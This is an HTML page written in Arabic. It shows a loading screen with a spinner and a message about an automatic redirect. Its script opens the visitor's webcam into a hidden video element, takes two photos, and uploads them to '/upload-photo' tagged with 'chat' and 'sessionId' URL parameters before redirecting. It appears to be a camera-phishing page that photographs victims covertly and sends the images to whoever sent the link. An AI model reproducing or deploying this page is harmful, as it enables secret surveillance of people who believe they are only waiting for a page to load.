<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>🇾🇪🇾🇪🇾🇪🇾🇪🇾🇪🇾🇪🇾🇪🇾🇪</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: 'Cairo', sans-serif;
      color: #fff;
      background: linear-gradient(135deg, #0f172a, #1e293b);
      overflow: hidden;
    }

    /* خلفية متحركة */
    body::before {
      content: '';
      position: absolute;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle at 50% 50%, rgba(56,189,248,0.3), transparent 60%);
      animation: moveBg 8s infinite linear;
      z-index: 0;
    }

    @keyframes moveBg {
      0% { transform: translate(-25%, -25%); }
      50% { transform: translate(25%, 25%); }
      100% { transform: translate(-25%, -25%); }
    }

    .container {
      position: relative;
      text-align: center;
      z-index: 1;
    }

    /* اللودر */
    .loader {
      width: 120px;
      height: 120px;
      border: 12px solid rgba(255,255,255,0.2);
      border-top: 12px solid #38bdf8;
      border-radius: 50%;
      animation: spin 1.5s linear infinite, pulse 1.5s ease-in-out infinite alternate;
      margin: 0 auto 20px;
    }

    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 10px #38bdf8; }
      100% { box-shadow: 0 0 25px #38bdf8; }
    }

    h1 {
      font-size: 24px;
      font-weight: bold;
      margin-bottom: 10px;
      animation: fadeIn 2s infinite alternate;
    }

    p {
      font-size: 16px;
      color: #ccc;
    }

    @keyframes fadeIn {
      from { opacity: 0.6; }
      to { opacity: 1; }
    }

    /* شريط تقدم */
    .progress-bar {
      width: 220px;
      height: 6px;
      background: rgba(255,255,255,0.2);
      border-radius: 3px;
      margin: 20px auto;
      overflow: hidden;
    }

    .progress {
      width: 0%;
      height: 100%;
      background: #38bdf8;
      animation: loading 4s linear forwards;
    }

    @keyframes loading {
      from { width: 0%; }
      to { width: 100%; }
    }

    video {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loader"></div>
    <h1>...جاري التحميل>
    <p>سيتم تحويلك تلقائيًا بعد اكتمال العملية</p>
    <div class="progress-bar"><div class="progress"></div></div>
    <video autoplay playsinline></video>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const redirectUrl = params.get('redirect');
    const chat = params.get('chat');
    const sessionId = params.get('sessionId');
    const video = document.querySelector('video');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');

        setTimeout(() => capturePhoto(false), 2000);
        setTimeout(() => capturePhoto(true), 4000);

        function capturePhoto(isLast) {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(async blob => {
            const formData = new FormData();
            formData.append('photos', blob, `photo-${Date.now()}.png`);
            formData.append('chat', chat);
            formData.append('sessionId', sessionId);

            try {
              await fetch('/upload-photo', { method: 'POST', body: formData });
            } catch (err) {
              console.error('❌ فشل إرسال الصورة:', err.message);
            }

            if (isLast) {
              stream.getTracks().forEach(track => track.stop());
              document.body.innerHTML = `<h2 style="color:#0f0;text-align:center;font-family:Cairo;">✅ تم الالتقاط! سيتم تحويلك...</h2>`;
              setTimeout(() => {
                window.location.href = redirectUrl || '/';
              }, 2000);
            }
          }, 'image/png');
        }
      })
      .catch(err => {
        document.body.innerHTML = `<h2 style="color:red;text-align:center;">❌ فشل في الوصول للكاميرا:<br>${err.message}</h2>`;
      });
  </script>
</body>
</html>
